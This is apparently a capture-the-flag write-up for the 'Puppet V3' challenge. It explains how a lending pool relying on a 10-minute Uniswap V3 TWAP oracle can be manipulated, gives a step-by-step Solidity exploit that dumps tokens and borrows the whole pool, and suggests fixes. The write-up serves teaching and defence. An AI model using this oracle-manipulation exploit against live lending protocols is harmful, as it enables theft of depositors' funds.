# Challenge #17: Puppet V3

- **Difficulty:** Hard
- **Category:** Uniswap V3 TWAP Manipulation / Concentrated Liquidity
- **Severity:** Critical
- **Status:** SOLVED ✅

## Overview

`PuppetV3Pool` is a lending pool that uses a **Uniswap V3 pool with concentrated liquidity** as its price oracle. It queries the TWAP (time-weighted average price) over a 10-minute window to determine collateral requirements for DVT borrowing against WETH.

## Vulnerability

While Uniswap V3 provides TWAP (an improvement over V1/V2 spot prices), a **10-minute window** is too short for a pool with **concentrated liquidity**. By dumping a large amount of tokens into the pool, the attacker can manipulate the TWAP enough to borrow the entire pool with minimal collateral.

The concentrated liquidity nature of V3 makes this even easier than V2: liquidity is concentrated in narrow price ranges, so a single large swap can exhaust all liquidity and dramatically move the average price.

```solidity
// Oracle uses 10-minute TWAP from Uniswap V3
function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) {
    // Uses OracleLibrary.consult with 10-minute window
    uint256 twap = OracleLibrary.consult(pool, 10 minutes);
    return (tokenAmount * twap) / 1e18;
}
```

## Exploit Walkthrough

```solidity
// Step 1: Approve all DVT to Uniswap V3 router
token.approve(address(router), PLAYER_INITIAL_TOKEN_BALANCE);

// Step 2: Dump all 110 DVT into the V3 pool
ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
    tokenIn: address(token),
    tokenOut: address(weth),
    fee: 3000,
    recipient: address(this),
    amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
    amountOutMinimum: 0,
    sqrtPriceLimitX96: 0
});
router.exactInputSingle(params);

// Step 3: Wait for TWAP to reflect the crashed price
// Loop with skip(10) until collateral requirement drops enough
while (lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE) 
       > weth.balanceOf(player)) {
    skip(10);  // Advance time by 10 seconds
}

// Step 4: Approve WETH and borrow
weth.approve(address(lendingPool), type(uint256).max);
lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);

// Step 5: Send to recovery
token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
```

The key insight: a **10-minute TWAP window** is insufficient when the pool has shallow concentrated liquidity. The attacker only needs to wait through the TWAP period for the manipulated average to become usable.

## Real-World Impact

Multiple protocols using short TWAP windows on Uniswap V3 have been exploited:
- **Euler Finance** used variable TWAP windows; shorter windows were more vulnerable
- **Silo Finance** faced TWAP manipulation attempts
- **Chronos** and other Arbitrum protocols had concentrated liquidity oracle attacks

## Remediation

```solidity
// FIX 1: Increase TWAP window significantly (24+ hours)
uint256 twap = OracleLibrary.consult(pool, 24 hours);

// FIX 2: Add minimum liquidity requirement
require(IUniswapV3Pool(pool).liquidity() > MIN_LIQUIDITY, "Insufficient liquidity");

// FIX 3: Use Chainlink as primary oracle, TWAP as fallback
// FIX 4: Add price deviation limits (block if price moves > X% in window)
```

## Key Takeaway

> **Short TWAP windows on concentrated liquidity pools are still manipulable. The "concentration" in V3 amplifies price impact. Use 24+ hour TWAP windows, minimum liquidity checks, or external oracles for lending protocols.**
